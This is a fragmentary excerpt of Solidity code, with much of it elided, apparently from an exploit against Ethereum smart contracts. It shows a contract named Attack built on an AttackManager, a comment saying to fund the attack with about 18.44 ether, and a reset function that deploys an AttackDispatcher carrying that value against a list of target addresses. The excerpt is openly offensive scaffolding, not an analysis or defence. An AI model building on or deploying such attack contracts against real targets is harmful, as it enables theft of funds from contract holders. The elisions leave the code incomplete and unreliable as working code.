 ...
 * parameter. Make sure to send at least 18 ether and 446744073709289473 wei to the attack
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0xfffffffffffc0001; /* equals 18 ether and 446744073709289473 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[0] = new AttackDispatcher{value: 18446744073709289472 }(0, _targets);
    }
